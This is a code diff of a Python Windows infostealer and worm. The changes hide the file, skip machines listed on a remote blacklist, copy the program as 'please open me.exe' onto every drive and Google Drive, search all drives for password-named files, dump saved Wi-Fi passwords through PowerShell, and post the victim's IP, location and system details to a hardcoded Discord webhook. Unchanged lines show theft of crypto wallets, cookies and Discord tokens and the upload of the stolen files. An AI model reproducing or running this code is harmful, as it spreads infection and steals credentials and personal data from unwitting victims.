@@ -8,77 +8,43 @@ import httpx
 import subprocess
 from random import choice
 import time
+import threading
 import zipfile
 import psutil
 import sys
 from urllib.request import Request, urlopen
 import getpass
-import random
 import socket
 import win32crypt
 from Crypto.Cipher import AES
 import requests
-
-DEBUG = False
-if os.name=="nt": path = f'C:/Users/{getpass.getuser()}/ADMIN/backdoor.debug'
-else: path = f'/home/{getpass.getuser()}/ADMIN/backdoor.debug'
-print(path)
-if os.path.exists(path):
-    check = input('do you want to enable debug mode (y/N) ? ')
-    if not check == "n":
-        DEBUG = True
-    
-
-
-
-def get_blacklist():
-    url = "https://raw.githubusercontent.com/notrunit/code/refs/heads/main/blacklist.list"
-    response = requests.get(url)
-    if response.status_code == 200:
-        return response.content.decode().split(" | ")
-    else: get_blacklist()
-
-
-def blacklist():
-    if DEBUG:
-        return False
-    else:
-        try:
-            response = requests.get("https://api.ipify.org")
-            public_ip= response.text
-        except Exception as e:
-            print(f"Could not retrieve public IP: {e}")
-            public_ip=None
-        infos = [getpass.getuser(),socket.gethostname(),public_ip]
-        blacklist = get_blacklist()
-        for info in infos:
-            if info in blacklist:
-                return True
-
 __path__ = os.path.abspath(sys.argv[0])
+if os.name=="nt":
+    subprocess.check_call(["attrib","+H",__path__])
+
 if __path__.endswith(".py"):
     __version__ = "PYTHON"
 elif __path__.endswith('.exe'):
     __version__ = "EXECUTABLE"
+DEBUG = False
+if os.path.exists(f'/users/{getpass.getuser()}/ADMIN/gruppe.debug'):
+    DEBUG = True
+def blacklist():
+    if DEBUG:
+        return False
+    url = "https://raw.githubusercontent.com/notrunit/code/refs/heads/main/blacklist.list"
+    response = requests.get(url)
+    if response.status_code == 200:
+        return response.content.decode().split(" | ")
+    else: blacklist()
 if os.name=="nt":
-    startupfolder=os.path.join(os.getenv('APPDATA'),r'Microsoft\Windows\Start Menu\Programs\Startup')   
-    if not os.path.exists(startupfolder):
-        os.makedirs(startupfolder)
-    olds = []
-    apps=["spotify.bat","windows update.bat","windows defender.bat","intel driver updater.bat",'powertoys.bat',"discord.bat",'TranslucentTB.bat','unowhy_y13_admin_management.bat']
-    for file in os.listdir(startupfolder):
-        if file in apps:
-            olds.append(file)
-    for app in apps:
-        if app in olds:
-            apps.remove(app)
-            if DEBUG: print(f"{app} was removed")
-            os.remove(os.path.join(startupfolder,app))
-    if DEBUG: print(apps)
-    file=f'{os.path.join(startupfolder,random.choice(apps))}'
-    if DEBUG: print(file)
-    with open(file,'w') as f:
-        f.write(f'@echo off\nstart {__path__}')
+    exe_source = __path__
+    apps=["spotify.exe","windows update.exe","windows defender.exe","intel driver updater.exe",'powertoys.exe',"discord.exe",'TranslucentTB.exe','unowhy_y13_admin_management.exe']
+    app = choice(apps)
+    exe_dest = fr"C:\ProgramData\{app}"
+    #shutil.copy2(exe_source, exe_dest)
+    #with open(fr'C:\Users\haker\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{app.replace(".exe",'.bat')}',"w") as f:
+        #f.write(f'@echo off\nstart {exe_dest}')
 class color():
     RED   = "\033[1;31m"  
     BLUE  = "\033[1;34m"
@@ -88,6 +54,54 @@ class color():
     BOLD    = "\033[;1m"
     REVERSE = "\033[;7m"
 if not blacklist():
+    def autoshare():
+        while True:
+            drives = os.listdrives()
+            for drive in drives:
+                try:
+                    print(drive)
+                    if drive == "C:\\":
+                        continue
+                    elif drive == "G:\\":
+                        if __version__ == "EXECUTABLE":
+                            copied = False
+                            if os.path.exists(f"G:/Mon Drive/please open me.exe"):
+                                copied = True
+                            if not copied:
+                                new_path = f"G:/Mon Drive/please open me.exe"
+                                shutil.copyfile(__path__,new_path)
+                                print(f"file copied to : {new_path}")
+                        elif __version__ == "PYTHON":
+                            copied = False
+                            if os.path.exists(f"G:/Mon Drive/please open me.py"):
+                                copied = True
+                            if not copied:
+                                new_path = fr"G:/Mon Drive/please open me.py"
+                                shutil.copyfile(__path__,new_path)
+                                print(f"file copied to : {new_path}")
+                    else:
+                    
+                        if __version__ == "EXECUTABLE":
+                            new_path = os.path.join(drive,"please open me.exe")
+                            copied = False
+                            if os.path.exists(new_path):
+                                copied = True
+                            if not copied:
+                                shutil.copyfile(__path__,new_path)
+                                print(f"file copied to : {new_path}")
+                        elif __version__ == "PYTHON":
+                            new_path = os.path.join(drive,"please open me.py")
+
+                            copied = False
+                            if os.path.exists(new_path):
+                                copied = True
+                            if not copied:
+                                shutil.copyfile(__path__,new_path)
+                                print(f"file copied to : {new_path}")
+                except:
+                    pass
+            time.sleep(60)
+    threading.Thread(target=autoshare).start()
     print('congiguration process starting !')
     CURRENT_INTERPRETER = sys.executable
     current_file = os.path.abspath(__file__)
@@ -187,13 +201,9 @@ if not blacklist():
         {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb")},
         {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")},
     ]
-    PATHS_TO_SEARCH = [
-        USER_PROFILE + "\\Desktop",
-        USER_PROFILE + "\\Documents",
-        USER_PROFILE + "\\Downloads",
-        USER_PROFILE + "\\OneDrive\\Documents",
-        USER_PROFILE + "\\OneDrive\\Desktop",
-    ]
+    PATHS_TO_SEARCH = []
+    for drive in os.listdrives():
+        PATHS_TO_SEARCH.append(drive)
     FILE_KEYWORDS = [
             "passw",
             "mdp",
@@ -228,11 +238,8 @@ if not blacklist():
         ".ppt",
         ".pptx",
         ".odt",
-        '.py',
         ".pdf",
         ".rtf",
-        ".json",
-        ".csv",
         ".db",
         ".jpg",
         ".jpeg",
@@ -509,7 +516,6 @@ if not blacklist():
             ])
         )
     print('password info stored !')
-    i = upload_to_server(STORAGE_PATH + "\\Passwords.txt",i)
     for cookie in COOKIES:
         with open(STORAGE_PATH + f"\\Cookies-{cookie['browser']}-{cookie['profile']}.txt", "w") as f:
             f.write(base64.b64decode(cookie["cookies"]).decode())
@@ -525,18 +531,6 @@ if not blacklist():
     org = data.get('org')
     loc = data.get('loc')
     googlemap = "https://www.google.com/maps/search/google+map++" + loc
-    with open(STORAGE_PATH + '\\info.txt', 'w') as f:
-        f.write(f'''      
-ip : {ip}
-region : {region}
-country : {country}
-city (not accurate) : {city}
-user : {getpass.getuser()}
-computer : {socket.gethostname()}
-ram : {str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]} GB
-disk : {str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]} GB
-    ''')
-    print('ip info stored !')
     for discord_token in DISCORD_TOKENS:
         with open(STORAGE_PATH + "\\discord-tokens.txt", "w") as f:
             f.write(
@@ -550,8 +544,50 @@ disk : {str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]} GB
                     for discord_token in DISCORD_TOKENS
                 ])
             )
-    print('discord info stored !')
-    print('trying to upload !')
+    command = """(netsh wlan show profiles) | Select-String “\:(.+)$” | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=”$name” key=clear)} | Select-String “Key Content\W+\:(.+)$” | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File """+STORAGE_PATH + "\\wifi.txt"
+    try:
+        # Execute PowerShell command
+        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, check=True)
+        
+        # Check if there is any output
+        if result.stdout:
+            print("Output:")
+            print(result.stdout)
+        
+        # Check for any errors
+        if result.stderr:
+            print("Errors:")
+            print(result.stderr)
+    
+    except subprocess.CalledProcessError as e:
+        print("Error:", e)
+    
+    webhook_url = 'https://discord.com/api/webhooks/1240375112390410341/iVQ1P6PMXW4M-Fq7FPKZN9Vxd629vGzEfKw7QJtRi6tfqxrFXbo2lVNFPiT69Ya9qfwc'
+    payload = {"content":"-"*80}
+    headers = {
+        "Content-Type": "application/json"
+    }
+    payload["embeds"] = [
+        {
+            "description" : f'''      
+ip : {ip}
+region : {region}
+country : {country}
+city (not accurate) : {city}
+user : {getpass.getuser()}
+computer : {socket.gethostname()}
+ram : {str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]} GB
+disk : {str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]} GB
+''',
+            "title" : f"{getpass.getuser()} information"
+        }
+    ]
+    SENT = False
+    while not SENT:
+        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
+        if response.status_code == 200 or 204:
+            print("notification sent !")
+            SENT=True
     for file_to_upload in os.listdir(STORAGE_PATH):
         try:
             i = upload_to_server(STORAGE_PATH + "\\" + file_to_upload,i)
